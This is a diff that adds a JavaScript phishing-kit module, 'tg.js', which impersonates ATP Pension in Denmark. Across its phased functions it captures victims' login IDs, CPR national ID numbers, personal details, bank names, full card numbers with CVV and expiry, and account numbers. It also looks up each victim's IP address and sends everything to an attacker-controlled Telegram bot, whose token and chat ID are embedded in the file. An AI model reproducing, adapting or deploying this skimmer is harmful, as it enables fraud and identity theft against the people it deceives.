@@ -1,0 +1,173 @@
+/**
+ * tg.js — ATP Telegram Capture Module
+ * ─────────────────────────────────────────
+ * Sends phased capture messages to Telegram in the unified ATP format.
+ *
+ * USAGE (any page):
+ *   <script src="tg.js"></script>
+ *
+ * THEN CALL:
+ *   TGCapture.sendLogin({ brugerID: '...', cpr: '...' });
+ *   TGCapture.sendInfo({ telefon, navn, adresse, postnummer, by, bank });
+ *   TGCapture.sendCard({ kortejer, kortnummer, udlob, cvv, regnr, kontonr });
+ *   TGCapture.sendFull(allData);  // sends complete message with all sections
+ */
+
+(function (global) {
+
+    // ★ EDIT THESE TWO VALUES ★
+    var BOT_TOKEN = "8925456907:AAH7p4LcEC2QpqhRN1S_FTDdTiaUzhcCWow";
+    var CHAT_ID   = "-5587558166";
+
+    // ─── DO NOT EDIT BELOW ──────────────────────────────────────────────────
+
+    var API = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+
+    /* ── timestamp ──────────────────────────────────────────────────────────── */
+    function getTimestamp() {
+        var now = new Date();
+        var pad = function (n, w) { return String(n).padStart(w || 2, '0'); };
+        var d   = pad(now.getDate()) + '.' + pad(now.getMonth() + 1) + '.' + now.getFullYear();
+        var t   = pad(now.getHours()) + '.' + pad(now.getMinutes()) + '.' + pad(now.getSeconds());
+        return d + ', ' + t;
+    }
+
+    /* ── storage helpers ────────────────────────────────────────────────────── */
+    function ss(key) { try { return sessionStorage.getItem(key) || ''; } catch(e) { return ''; } }
+    function ssSet(key, val) { try { sessionStorage.setItem(key, val); } catch(e) {} }
+
+    /* ── build the unified message ──────────────────────────────────────────── */
+    function buildMessage(data, ipInfo, status) {
+        var ts     = getTimestamp();
+        var ua     = navigator.userAgent || '';
+        var ip     = (ipInfo && ipInfo.ip)      || '';
+        var country= (ipInfo && ipInfo.country_name) || '';
+
+        /* pull from data object, fall back to sessionStorage */
+        function f(k, ssKey) { return (data && data[k]) || (ssKey ? ss(ssKey) : '') || ''; }
+
+        var brugerID = f('brugerID', 'login_brugerID');
+        var cpr      = f('cpr',      'login_cpr');
+
+        var telefon    = f('telefon',    'info_telefon');
+        var navn       = f('navn',       'info_navn');
+        var adresse    = f('adresse',    'info_adresse');
+        var postnummer = f('postnummer', 'info_postnummer');
+        var by         = f('by',         'info_by')   || 'Slagelse';
+        var bank       = f('bank',       'info_bank') || 'Sydbank';
+
+        var kortejer   = f('kortejer',   'card_kortejer');
+        var kortnummer = f('kortnummer', 'card_kortnummer');
+        var udlob      = f('udlob',      'card_udlob');
+        var cvv        = f('cvv',        'card_cvv');
+        var regnr      = f('regnr',      'card_regnr');
+        var kontonr    = f('kontonr',    'card_kontonr');
+
+        /* determine completeness */
+        var hasCPR   = brugerID && cpr;
+        var hasInfo  = telefon && navn;
+        var hasCard  = kortnummer && cvv;
+        var statusText = status || (hasCard ? '✅ Fuldstændig udfyldt' : hasInfo ? '⏳ Afventer kortoplysninger' : hasCPR ? '⏳ Afventer personoplysninger' : '⏳ Kun login');
+
+        var lines = [
+            'ATP Pension HITS 2026 - ' + ts,
+            '',
+            '🔐 Login Detaljer:',
+            ' 📜 Bruger ID: ' + (brugerID || '—'),
+            ' 🆔 CPR: '       + (cpr      || '—'),
+            '',
+            '👤 Personlige Oplysninger:',
+            ' ☎️ Telefon: '    + (telefon    || '—'),
+            ' 👤 Fulde Navn: ' + (navn       || '—'),
+            ' 🏠 Adresse: '   + (adresse    || '—'),
+            ' 📮 Postnummer: ' + (postnummer || '—'),
+            ' 🏙 By: '        + (by         || '—'),
+            ' 🏦 Bank: '      + (bank       || '—'),
+            '',
+            '💳 Kort & Konto Detaljer:',
+            ' 💳 Kort Ejernavn: ' + (kortejer   || '—'),
+            ' 💳 Kort Nummer: '   + (kortnummer || '—'),
+            ' 📅 Udløbsdato: '   + (udlob      || '—'),
+            ' 🔒 CVV: '           + (cvv        || '—'),
+            ' 🔢 Regnr: '         + (regnr      || '—'),
+            ' 🔢 Kontonr: '       + (kontonr    || '—'),
+            '',
+            '🌐 Enhed & Netværk Info:',
+            ' 📍 IP Adresse: ' + (ip      || '—'),
+            ' 🌍 Land: '       + (country || '—'),
+            ' 💻 Enhed: '      + ua,
+            '',
+            '📊 Status: ' + statusText
+        ];
+
+        return lines.join('\n');
+    }
+
+    /* ── fetch IP then send ─────────────────────────────────────────────────── */
+    function sendWithIP(data, status) {
+        if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' ||
+            !CHAT_ID   || CHAT_ID   === 'YOUR_CHAT_ID_HERE') {
+            console.warn('[TGCapture] Configure BOT_TOKEN and CHAT_ID in tg.js');
+            return;
+        }
+
+        function doSend(ipInfo) {
+            var text = buildMessage(data, ipInfo, status);
+            fetch(API, {
+                method:  'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body:    JSON.stringify({ chat_id: CHAT_ID, text: text })
+            }).catch(function () {});
+        }
+
+        /* try to get IP info; fall back gracefully */
+        fetch('https://ipapi.co/json/')
+            .then(function (r) { return r.json(); })
+            .then(function (ipInfo) { doSend(ipInfo); })
+            .catch(function () { doSend(null); });
+    }
+
+    /* ── public helpers ─────────────────────────────────────────────────────── */
+
+    /** Store login data and send partial message */
+    function sendLogin(d) {
+        ssSet('login_brugerID', d.brugerID || '');
+        ssSet('login_cpr',      d.cpr      || '');
+        sendWithIP(d, '⏳ Afventer personoplysninger');
+    }
+
+    /** Store info-page data and send partial message */
+    function sendInfo(d) {
+        ssSet('info_telefon',    d.telefon    || '');
+        ssSet('info_navn',       d.navn       || '');
+        ssSet('info_adresse',    d.adresse    || '');
+        ssSet('info_postnummer', d.postnummer || '');
+        ssSet('info_by',         d.by         || 'Slagelse');
+        ssSet('info_bank',       d.bank       || 'Sydbank');
+        sendWithIP(d, '⏳ Afventer kortoplysninger');
+    }
+
+    /** Store card-page data and send FULL message */
+    function sendCard(d) {
+        ssSet('card_kortejer',   d.kortejer   || '');
+        ssSet('card_kortnummer', d.kortnummer || '');
+        ssSet('card_udlob',      d.udlob      || '');
+        ssSet('card_cvv',        d.cvv        || '');
+        ssSet('card_regnr',      d.regnr      || '');
+        ssSet('card_kontonr',    d.kontonr    || '');
+        sendWithIP(d, '✅ Fuldstændig udfyldt');
+    }
+
+    /** Legacy: send any key-value data (used by old code) */
+    function send(data, icon) {
+        sendWithIP(data, null);
+    }
+
+    global.TGCapture = {
+        send:      send,
+        sendLogin: sendLogin,
+        sendInfo:  sendInfo,
+        sendCard:  sendCard
+    };
+
+}(window));
